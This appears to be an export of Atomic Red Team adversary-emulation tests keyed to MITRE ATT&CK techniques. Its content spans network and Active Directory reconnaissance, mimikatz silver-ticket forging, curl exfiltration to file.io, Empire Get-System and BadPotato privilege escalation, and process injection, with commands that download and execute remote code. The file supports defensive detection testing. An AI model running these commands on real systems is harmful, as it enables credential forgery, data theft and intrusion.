dependencies.0.get_prereq_command: (which yum && yum -y install net-tools)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y net-tools)

",
T1016,System Network Configuration Discovery,System Network Configuration Discovery (TrickBot Style),dafaf052-5508-402d-bf77-51e0700c02e2,"Identify network configuration information as seen by Trickbot and described here https://www.sneakymonkey.net/2019/10/29/trickbot-analysis-part-ii/

Upon successful execution, cmd.exe will spawn `ipconfig /all`, `net config workstation`, `net view /all /domain`, `nltest /domain_trusts`. Output will be via stdout.
",windows,,,"ipconfig /all
net config workstation
net view /all /domain
nltest /domain_trusts
",command_prompt,,,,,,
T1016,System Network Configuration Discovery,List Open Egress Ports,4b467538-f102-491d-ace7-ed487b853bf5,"This is to test for what ports are open outbound.  The technique used was taken from the following blog:
https://www.blackhillsinfosec.com/poking-holes-in-the-firewall-egress-testing-with-allports-exposed/

Upon successful execution, powershell will read top-128.txt (ports) and contact each port to confirm if open or not. Output will be to Desktop\open-ports.txt.
",windows,,,"$ports = Get-content ""#{port_file}""
$file = ""#{output_file}""
$totalopen = 0
$totalports = 0
New-Item $file -Force
foreach ($port in $ports) {
    $test = new-object system.Net.Sockets.TcpClient
    $wait = $test.beginConnect(""allports.exposed"", $port, $null, $null)
    $wait.asyncwaithandle.waitone(250, $false) | Out-Null
    $totalports++ | Out-Null
    if ($test.Connected) {
        $result = ""$port open"" 
        Write-Host -ForegroundColor Green $result
        $result | Out-File -Encoding ASCII -append $file
        $totalopen++ | Out-Null
    }
    else {
        $result = ""$port closed"" 
        Write-Host -ForegroundColor Red $result
        $totalclosed++ | Out-Null
        $result | Out-File -Encoding ASCII -append $file
    }
}
$results = ""There were a total of $totalopen open ports out of $totalports ports tested.""
$results | Out-File -Encoding ASCII -append $file
Write-Host $results
",powershell,,,"Remove-Item -ErrorAction ignore ""#{output_file}""
",powershell,"dependencies.0.description: Test requires #{port_file} to exist

dependencies.0.prereq_command: if (Test-Path ""#{port_file}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{port_file}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""#{portfile_url}"" -OutFile ""#{port_file}""

","input_arguments.output_file.description: Path of file to write port scan results

input_arguments.output_file.type: path

input_arguments.output_file.default: $env:USERPROFILE\Desktop\open-ports.txt

input_arguments.portfile_url.description: URL to top-128.txt

input_arguments.portfile_url.type: url

input_arguments.portfile_url.default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1016/src/top-128.txt

input_arguments.port_file.description: The path to a text file containing ports to be scanned, one port per line. The default list uses the top 128 ports as defined by Nmap.

input_arguments.port_file.type: path

input_arguments.port_file.default: PathToAtomicsFolder\T1016\src\top-128.txt

"
T1016,System Network Configuration Discovery,Adfind - Enumerate Active Directory Subnet Objects,9bb45dd7-c466-4f93-83a1-be30e56033ee,"Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Subnet Objects
reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=subnet) #{optional_args}
",command_prompt,,,,powershell,"dependencies.0.description: AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe)

dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null
Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe""

","input_arguments.optional_args.description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use ""-arg"" notation to add arguments separated by spaces.

input_arguments.optional_args.type: string

input_arguments.optional_args.default: None

"
T1016,System Network Configuration Discovery,Qakbot Recon,121de5c6-5818-4868-b8a7-8fd07c455c1b,A list of commands known to be performed by Qakbot for recon purposes,windows,,,"""#{recon_commands}""
",command_prompt,,,,powershell,"dependencies.0.description: File to copy must exist on disk at specified location (#{recon_commands})

dependencies.0.prereq_command: if (Test-Path ""#{recon_commands}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{recon_commands}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1016/src/qakbot.bat"" -OutFile ""#{recon_commands}""

","input_arguments.recon_commands.description: File that houses list of commands to be executed

input_arguments.recon_commands.type: path

input_arguments.recon_commands.default: PathToAtomicsFolder\T1016\src\qakbot.bat

"
T1016,System Network Configuration Discovery,List macOS Firewall Rules,ff1d8c25-2aa4-4f18-a425-fede4a41ee88,"""This will test if the macOS firewall is enabled and/or show what rules are configured. Must be run with elevated privileges. Upon successful execution, these commands will output various information about the firewall configuration, including status and specific port/protocol blocks or allows. 

Using `defaults`, additional arguments can be added to see filtered details, such as `globalstate` for global configuration (\""Is it on or off?\""), `firewall` for common application allow rules, and `explicitauths` for specific rules configured by the user. 

Using `socketfilterfw`, flags such as --getglobalstate or --listapps can be used for similar filtering. At least one flag is required to send parseable output to standard out. 
",macos,,,"sudo defaults read /Library/Preferences/com.apple.alf
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate
",bash,True,,,,,
T1016,System Network Configuration Discovery,DNS Server Discovery Using nslookup,34557863-344a-468f-808b-a1bfb89b4fa9,"Identify System domain dns controller on an endpoint using nslookup ldap query. This tool is being abused by qakbot malware to gather information on the domain
controller of the targeted or compromised host. reference https://securelist.com/qakbot-technical-analysis/103931/
",windows,,,"nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.%USERDNSDOMAIN%
",command_prompt,,,,,,
T1558.002,Steal or Forge Kerberos Tickets: Silver Ticket,Crafting Active Directory silver tickets with mimikatz,385e59aa-113e-4711-84d9-f637aef01f2c,"Once the hash of service account is retrieved it is possible to forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets.
The generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.
",windows,,,"Remove-Item $env:TEMP\silver.bat -ErrorAction Ignore
Remove-Item $env:TEMP\silver.txt -ErrorAction Ignore

# get current domain SID if default was used
$domain_sid = ""#{domain_sid}""
If ($domain_sid -Match ""DEFAULT"") {
  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60
  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain
  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value
  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))
}

# create batch file with commands to run in a separate ""runas /netonly"" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to silver.txt temp file, because we cannot capture ""runas /netonly"" output otherwise
@""
>%TEMP%\silver.txt 2>&1 (
  echo Purge existing tickets and create silver ticket:
  klist purge
  #{mimikatz_path} ""kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{service_aes256_key} /user:#{account} /service:HOST /target:#{target}.#{domain} /ptt"" ""exit""

  echo.
  echo executing:schtasks /query /S #{target}.#{domain}
  schtasks /query /S #{target}.#{domain}
  
  echo.
  echo Tickets after requesting schtasks:
  klist

  echo.
  echo End of Silver Ticket attack
)
""@ -Replace ""DOMAIN_SID"", $domain_sid | Out-File -Encoding OEM $env:TEMP\silver.bat

# run batch file in a new empty session (password and username do not matter)
echo ""foo"" | runas /netonly /user:fake ""$env:TEMP\silver.bat"" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path ""$env:TEMP\silver.txt"" -Wait | ForEach-Object {
    if ($_ -match 'End of Silver Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\silver.txt

# cleanup temp files
Remove-Item $env:TEMP\silver.bat -ErrorAction Ignore
Remove-Item $env:TEMP\silver.txt -ErrorAction Ignore
",powershell,False,,,powershell,"dependencies.0.description: Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})

dependencies.0.prereq_command: $mimikatz_path = cmd /c echo #{mimikatz_path}
if (Test-Path $mimikatz_path) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1"" -UseBasicParsing) 
$releases = ""https://api.github.com/repos/gentilkiwi/mimikatz/releases""
$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith("".zip"") }
$mimikatz_exe = cmd /c echo #{mimikatz_path}
$basePath = Split-Path $mimikatz_exe | Split-Path
Invoke-FetchFromZip $zipUrl ""x64/mimikatz.exe"" $basePath

","input_arguments.domain_sid.description: SID of the targeted domain, if you keep default it will automatically get the current domain SID

input_arguments.domain_sid.type: string

input_arguments.domain_sid.default: S-1-5-21-DEFAULT

input_arguments.domain.description: Targeted Active Directory domain FQDN

input_arguments.domain.type: string

input_arguments.domain.default: %userdnsdomain%

input_arguments.account.description: Account to impersonate

input_arguments.account.type: string

input_arguments.account.default: silverticketfakeuser

input_arguments.target.description: System you want to target (Default will be logon server)

input_arguments.target.type: string

input_arguments.target.default: %logonserver:\\=%

input_arguments.service_aes256_key.description: AES256 key (you will need to set to match your service key for your target)

input_arguments.service_aes256_key.type: string

input_arguments.service_aes256_key.default: b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9

input_arguments.mimikatz_path.description: Mimikatz windows executable

input_arguments.mimikatz_path.type: path

input_arguments.mimikatz_path.default: PathToAtomicsFolder\..\ExternalPayloads\mimikatz\x64\mimikatz.exe

"
T1048.002,Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol,Exfiltrate data HTTPS using curl windows,1cdf2fb0-51b6-4fd8-96af-77020d5f1bf0,"Exfiltrate data HTTPS using curl to file share site file.io
",windows,,,"#{curl_path} -k -F ""file=@#{input_file}"" https://file.io/
",command_prompt,False,,,powershell,"dependencies.0.description: Curl must be installed on system.

dependencies.0.prereq_command: if (Test-Path #{curl_path}) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://curl.se/windows/dl-8.4.0_6/curl-8.4.0_6-win64-mingw.zip"" -Outfile ""PathToAtomicsFolder\..\ExternalPayloads\curl.zip""
Expand-Archive -Path ""PathToAtomicsFolder\..\ExternalPayloads\curl.zip"" -DestinationPath ""PathToAtomicsFolder\..\ExternalPayloads\curl""
Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\curl\curl-8.4.0_6-win64-mingw\bin\curl.exe"" C:\Windows\System32\Curl.exe

dependencies.1.description: #{input_file} must be exist on system.

dependencies.1.prereq_command: if (Test-Path ""#{input_file}"") {exit 0} else {exit 1}

dependencies.1.get_prereq_command: New-Item -Type Directory (split-path ""#{input_file}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1048.002/src/artifact"" -OutFile ""#{input_file}""

","input_arguments.input_file.description: Test file to upload

input_arguments.input_file.type: path

input_arguments.input_file.default: PathToAtomicsFolder/T1048.002/src/artifact

input_arguments.curl_path.description: path to curl.exe

input_arguments.curl_path.type: path

input_arguments.curl_path.default: C:\Windows\System32\Curl.exe

"
T1048.002,Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol,"Exfiltrate data HTTPS using curl freebsd,linux or macos",4a4f31e2-46ea-4c26-ad89-f09ad1d5fe01,"Exfiltrate data HTTPS using curl to file share site file.io
",macos,linux,,"curl -F 'file=@#{input_file}' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/
",bash,False,,,,,"input_arguments.input_file.description: Test file to upload

input_arguments.input_file.type: path

input_arguments.input_file.default: PathToAtomicsFolder/T1048.002/src/artifact

"
T1134.001,Access Token Manipulation: Token Impersonation/Theft,Named pipe client impersonation,90db9e27-8e7c-4c04-b602-a45927884966,"Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script creates a named pipe, and a service that writes to that named pipe. When the service connects to the named pipe, the script impersonates its security context.
When executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).

Reference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose
",powershell,True,,,,,
T1134.001,Access Token Manipulation: Token Impersonation/Theft,`SeDebugPrivilege` token duplication,34f0a430-9d04-4d98-bcb5-1989f14719f0,"Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script uses `SeDebugPrivilege` to obtain, duplicate and impersonate the token of a another process.
When executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose
",powershell,True,,,,,
T1134.001,Access Token Manipulation: Token Impersonation/Theft,Launch NSudo Executable,7be1bc0f-d8e5-4345-9333-f5f67d742cb9,"Launches the NSudo executable for a short period of time and then exits.
NSudo download observed after maldoc execution. NSudo is a system management tool for advanced users to launch programs with full privileges.",windows,,,"Start-Process ""#{nsudo_path}"" -Argument ""-U:T -P:E cmd""
Start-Sleep -Second 5
Stop-Process -Name ""cmd"" -force -erroraction silentlycontinue
",powershell,,,,powershell,"dependencies.0.description: NSudoLG.exe must exist in the specified path #{nsudo_path}

dependencies.0.prereq_command: if (Test-Path ""#{nsudo_path}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\NSudo_8.2_All_Components.zip"" ""https://github.com/M2Team/NSudo/releases/download/8.2/NSudo_8.2_All_Components.zip""
Expand-Archive -Path ""PathToAtomicsFolder\..\ExternalPayloads\NSudo_8.2_All_Components.zip"" -DestinationPath ""PathToAtomicsFolder\..\ExternalPayloads\NSudo_8.2_All_Components"" -Force
Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\NSudo_8.2_All_Components\NSudo Launcher\x64\NSudoLG.exe"" ""#{nsudo_path}""
Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\NSudo_8.2_All_Components.zip"" -Recurse -ErrorAction Ignore
Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\NSudo_8.2_All_Components"" -Recurse -ErrorAction Ignore

","input_arguments.nsudo_path.description: Path to the NSudoLG.exe file

input_arguments.nsudo_path.type: path

input_arguments.nsudo_path.default: PathToAtomicsFolder\T1134.001\bin\NSudoLG.exe

"
T1134.001,Access Token Manipulation: Token Impersonation/Theft,Bad Potato,9c6d799b-c111-4749-a42f-ec2f8cb51448,"https://github.com/BeichenDream/BadPotato
Privilege escalation using named pipe connections",windows,,,"cd ""PathToAtomicsFolder\..\ExternalPayloads""
Start-Process .\BadPotato.exe notepad.exe
Start-Sleep -Second 20
Stop-Process -Name ""notepad"" -force -erroraction silentlycontinue
Stop-Process -Name ""BadPotato"" -force -erroraction silentlycontinue
",powershell,True,,"taskkill /f /im notepad.exe
",powershell,"dependencies.0.description: BadPotato.exe must exist in the temp directory

dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\BadPotato.exe"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\BadPotato.exe"" ""https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.001/bin/BadPotato.exe?raw=true""

",
T1055.011,Process Injection: Extra Window Memory Injection,Process Injection via Extra Window Memory (EWM) x64 executable,93ca40d2-336c-446d-bcef-87f14d438018,Hooks functions of main process to inject a payload via Extra Window Memory (EWM) injection technique,windows,,,#{exe_binary},powershell,False,,Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force,powershell,"dependencies.0.description: T1055.011x64.exe and payload must exist on disk at specified location (#{exe_binary} and #{payload_file})
dependencies.0.prereq_command: if (Test-Path #{exe_binary}) {exit 0} else {exit 1}
dependencies.0.get_prereq_command: New-Item -Type Directory (split-path #{exe_binary}) -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/T1055.011_#{arch}.exe"" -OutFile ""#{exe_binary}"" -UseBasicParsing
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/payload.exe_#{arch}.bin"" -OutFile ""#{payload_file}"" -UseBasicParsing
","input_arguments.arch.description: Architecture of payload. One of (x64, x86)

input_arguments.arch.type: string

input_arguments.arch.default: x64

input_arguments.exe_binary.description: PE binary for EWM injection

input_arguments.exe_binary.type: path

input_arguments.exe_binary.default: PathToAtomicsFolder\T1055.011\bin\T1055.011_#{arch}.exe

input_arguments.payload_file.description: raw payload to inject

input_arguments.payload_file.type: path

input_arguments.payload_file.default: PathToAtomicsFolder\T1055.011\bin\payload.exe_#{arch}.bin

"
T1018,Remote System Discovery,Remote System Discovery - net,85321a9c-897f-4a60-9f20-29788e50bccd,"Identify remote systems with net.exe.

Upon successful execution, cmd.exe will execute `net.exe view` and display results of local systems on the network that have file and print sharing enabled.
",windows,,,"net view /domain
net view
",command_prompt,,,,,,
T1018,Remote System Discovery,Remote System Discovery - net group Domain Computers,f1bf6c8f-9016-4edf-aff9-80b65f5d711f,"Identify remote systems with net.exe querying the Active Directory Domain Computers group.

Upon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the ""Domain Computers"" group. Output will be via stdout.
",windows,,,"net group ""Domain Computers"" /domain
",command_prompt,,,,,,
T1018,Remote System Discovery,Remote System Discovery - nltest,52ab5108-3f6f-42fb-8ba3-73bc054f22c8,"Identify domain controllers for specified domain.

Upon successful execution, cmd.exe will execute nltest.exe against a target domain to retrieve a list of domain controllers. Output will be via stdout.
",windows,,,"nltest.exe /dclist:#{target_domain}
",command_prompt,,,,,,"input_arguments.target_domain.description: Domain to query for domain controllers

input_arguments.target_domain.type: string

input_arguments.target_domain.default: %userdnsdomain%

"
T1018,Remote System Discovery,Remote System Discovery - ping sweep,6db1f57f-d1d5-4223-8a66-55c9c65a9592,"Identify remote systems via ping sweep.

Upon successful execution, cmd.exe will perform a for loop against the 192.168.1.1/24 network. Output will be via stdout.
",windows,,,"for /l %i in (#{start_host},1,#{stop_host}) do ping -n 1 -w 100 #{subnet}.%i  
",command_prompt,,,,,,"input_arguments.start_host.description: Last octet starting value for ping sweep.

input_arguments.start_host.type: string

input_arguments.start_host.default: 1

input_arguments.stop_host.description: Last octet ending value for ping sweep.

input_arguments.stop_host.type: string

input_arguments.stop_host.default: 254

input_arguments.subnet.description: Subnet used for ping sweep.

input_arguments.subnet.type: string

input_arguments.subnet.default: 192.168.1

"
T1018,Remote System Discovery,Remote System Discovery - arp,2d5a61f5-0447-4be4-944a-1f8530ed6574,"Identify remote systems via arp. 

Upon successful execution, cmd.exe will execute arp to list out the arp cache. Output will be via stdout.
",windows,,,"arp -a
",command_prompt,,,,,,
T1018,Remote System Discovery,Remote System Discovery - arp nix,acb6b1ff-e2ad-4d64-806c-6c35fe73b951,"Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
",linux,macos,,"arp -a | grep -v '^?'
",sh,,,,sh,"dependencies.0.description: Check if arp command exists on the machine

dependencies.0.prereq_command: if [ -x ""$(command -v arp)"" ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: (which yum && yum -y install net-tools)||(which apt-get && apt-get install -y net-tools)

",
T1018,Remote System Discovery,Remote System Discovery - sweep,96db2632-8417-4dbb-b8bb-a8b92ba391de,"Identify remote systems via ping sweep.

Upon successful execution, sh will perform a ping sweep on the 192.168.1.1/24 and echo via stdout if an IP is active.
",linux,macos,,"for ip in $(seq #{start_host} #{stop_host}); do ping -c 1 #{subnet}.$ip; [ $? -eq 0 ] && echo ""#{subnet}.$ip UP"" || : ; done
",sh,,,,,,"input_arguments.start_host.description: Subnet used for ping sweep.

input_arguments.start_host.type: string

input_arguments.start_host.default: 1

input_arguments.stop_host.description: Subnet used for ping sweep.

input_arguments.stop_host.type: string

input_arguments.stop_host.default: 254

input_arguments.subnet.description: Subnet used for ping sweep.

input_arguments.subnet.type: string

input_arguments.subnet.default: 192.168.1

"
T1018,Remote System Discovery,Remote System Discovery - nslookup,baa01aaa-5e13-45ec-8a0d-e46c93c9760f,"Powershell script that runs nslookup on cmd.exe against the local /24 network of the first network adaptor listed in ipconfig.

Upon successful execution, powershell will identify the ip range (via ipconfig) and perform a for loop and execute nslookup against that IP range. Output will be via stdout.
",windows,,,"$localip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
$pieces = $localip.split(""."")
$firstOctet = $pieces[0]
$secondOctet = $pieces[1]
$thirdOctet = $pieces[2]
foreach ($ip in 1..255 | % { ""$firstOctet.$secondOctet.$thirdOctet.$_"" } ) {cmd.exe /c nslookup $ip}
",powershell,True,,,,,
T1018,Remote System Discovery,Remote System Discovery - adidnsdump,95e19466-469e-4316-86d2-1dc401b5a959,"This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks
Python 3 and adidnsdump must be installed, use the get_prereq_command's to meet the prerequisites for this test.
Successful execution of this test will list dns zones in the terminal.
",windows,,,"adidnsdump -u #{user_name} -p #{acct_pass} --print-zones #{host_name}
",command_prompt,True,,,powershell,"dependencies.0.description: Computer must have python 3 installed

dependencies.0.prereq_command: if (python --version) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: echo ""Python 3 must be installed manually""

dependencies.1.description: Computer must have pip installed

dependencies.1.prereq_command: if (pip3 -V) {exit 0} else {exit 1}

dependencies.1.get_prereq_command: echo ""PIP must be installed manually""

dependencies.2.description: adidnsdump must be installed and part of PATH

dependencies.2.prereq_command: if (cmd /c adidnsdump -h) {exit 0} else {exit 1}

dependencies.2.get_prereq_command: pip3 install adidnsdump

","input_arguments.user_name.description: username including domain.

input_arguments.user_name.type: string

input_arguments.user_name.default: domain\user

input_arguments.acct_pass.description: Account password.

input_arguments.acct_pass.type: string

input_arguments.acct_pass.default: password

input_arguments.host_name.description: hostname or ip address to connect to.

input_arguments.host_name.type: string

input_arguments.host_name.default: 192.168.1.1

"
T1018,Remote System Discovery,Adfind - Enumerate Active Directory Computer Objects,a889f5be-2d54-4050-bd05-884578748bb4,"Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Computer Objects
reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=computer) #{optional_args}
",command_prompt,,,,powershell,"dependencies.0.description: AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe)

dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null
Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe""

","input_arguments.optional_args.description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use ""-arg"" notation to add arguments separated by spaces.

input_arguments.optional_args.type: string

input_arguments.optional_args.default: None

"
T1018,Remote System Discovery,Adfind - Enumerate Active Directory Domain Controller Objects,5838c31e-a0e2-4b9f-b60a-d79d2cb7995e,"Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Domain Controller Objects
reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" #{optional_args} -sc dclist
",command_prompt,,,,powershell,"dependencies.0.description: AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe)

dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null
Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe""

","input_arguments.optional_args.description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use ""-arg"" notation to add arguments separated by spaces.

input_arguments.optional_args.type: string

input_arguments.optional_args.default: None

"
T1018,Remote System Discovery,Remote System Discovery - ip neighbour,158bd4dd-6359-40ab-b13c-285b9ef6fa25,"Use the ip neighbour command to display the known link layer (ARP table) addresses for hosts sharing the same network segment. 
",linux,,,"ip neighbour show
",sh,,,,sh,"dependencies.0.description: Check if ip command exists on the machine

dependencies.0.prereq_command: if [ -x ""$(command -v ip)"" ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: apt-get install iproute2 -y

",
T1018,Remote System Discovery,Remote System Discovery - ip route,1a4ebe70-31d0-417b-ade2-ef4cb3e7d0e1,"Use the ip route command to display the kernels routing tables. 
",linux,,,"ip route show
",sh,,,,sh,"dependencies.0.description: Check if ip command exists on the machine

dependencies.0.prereq_command: if [ -x ""$(command -v ip)"" ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: apt-get install iproute2 -y

",
T1018,Remote System Discovery,Remote System Discovery - netstat,d2791d72-b67f-4615-814f-ec824a91f514,"Use the netstat command to display the kernels routing tables.
",linux,,,"netstat -r | grep default
",sh,,,,,,
T1018,Remote System Discovery,Remote System Discovery - ip tcp_metrics,6c2da894-0b57-43cb-87af-46ea3b501388,"Use the ip tcp_metrics command to display the recent cached entries for IPv4 and IPv6 source and destination addresses. 
",linux,,,"ip tcp_metrics show |grep --invert-match ""^127\.""
",sh,,,,sh,"dependencies.0.description: Check if ip command exists on the machine

dependencies.0.prereq_command: if [ -x ""$(command -v ip)"" ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: apt-get install iproute2 -y

",
T1018,Remote System Discovery,Enumerate domain computers within Active Directory using DirectorySearcher,962a6017-1c09-45a6-880b-adc9c57cb22e,"This test is a Powershell script that enumerates Active Directory to determine computers that are joined to the domain. 
This test is designed to mimic how SessionGopher can determine the additional systems within a domain, which has been used before by threat actors to aid in lateral movement. 
Reference: [Head Fake: Tackling Disruptive Ransomware Attacks](https://www.mandiant.com/resources/head-fake-tackling-disruptive-ransomware-attacks). 
Upon successful execution, this test will output the names of the computers that reside on the domain to the console window. 
",windows,,,"$DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher(""(ObjectCategory=Computer)"")
$DirectorySearcher.PropertiesToLoad.Add(""Name"")
$Computers = $DirectorySearcher.findall()
foreach ($Computer in $Computers) {
  $Computer = $Computer.Properties.name
  if (!$Computer) { Continue }
  Write-Host $Computer}
",powershell,False,,,powershell,"dependencies.0.description: This PC must be joined to a domain.
dependencies.0.prereq_command: if ((Get-WmiObject -Class Win32_ComputerSystem).partofdomain -eq $true) {exit 0} else {exit 1}
dependencies.0.get_prereq_command: write-host ""This PC must be manually added to a domain."" 
",
T1018,Remote System Discovery,Enumerate Active Directory Computers with Get-AdComputer,97e89d9e-e3f5-41b5-a90f-1e0825df0fdf,"The following Atomic test will utilize Get-AdComputer to enumerate Computers within Active Directory.
Upon successful execution a listing of Computers will output with their paths in AD.
Reference: https://github.com/MicrosoftDocs/windows-powershell-docs/blob/main/docset/winserver2022-ps/activedirectory/Get-ADComputer.md
",windows,,,"Get-AdComputer -Filter *
",powershell,False,,,,,
T1018,Remote System Discovery,Enumerate Active Directory Computers with ADSISearcher,64ede6ac-b57a-41c2-a7d1-32c6cd35397d,"The following Atomic test will utilize ADSISearcher to enumerate computers within Active Directory.
